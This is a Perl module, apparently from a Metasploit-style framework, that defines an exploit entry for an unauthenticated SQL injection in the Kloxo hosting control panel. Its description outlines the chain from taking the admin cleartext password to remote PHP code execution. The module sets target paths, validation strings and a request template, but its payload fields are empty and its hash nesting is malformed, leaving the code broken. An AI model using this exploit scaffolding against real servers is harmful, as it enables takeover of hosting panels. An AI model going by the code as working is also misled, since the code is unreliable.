package KLOXO::MSF::KloxoSqli;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "KloxoSqli";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION     => "

        This module exploits an unauthenticated SQL injection vulnerability affecting Kloxo, as

        exploited in the wild on January 2014. The SQL injection issue can be abused in order to

        retrieve the Kloxo admin cleartext password from the database. With admin access to the

        web control panel, remote PHP code execution can be achieved by abusing the Command Center

        function. The module tries to find the first server in the tree view, unless the server

        information is provided, in which case it executes the payload there.

      ",
  FRM_CLIENTTITLE => "admin",
  METHOD          => "GET",
  MSF_MODULE      => "kloxo_sqli",
  PATH            => "frm_action=show&",
  PATHS           => ["display.php", ""],
  PAYLOAD         => "?",
  REFERENCES      => [
                       "https://vpsboard.com/topic/3384-kloxo-installations-compromised/",
                       "http://www.webhostingtalk.com/showthread.php?p=8996984",
                       "http://forum.lxcenter.org/index.php?t=msg&th=19215&goto=102646",
                     ],
  TITLE           => "Kloxo SQL Injection and Remote Code Execution",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The URI of the Kloxo Application", VALUE => "/" },
  },
      },  VALIDATION => {
    'TSTRING' =>       (
  "<input type=hidden name=\"frm_subaction\" value =\"commandcenter\">",
  "__error_only_clients_and_auxiliary_allowed_to_login",
  "_error_login_error",
),

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
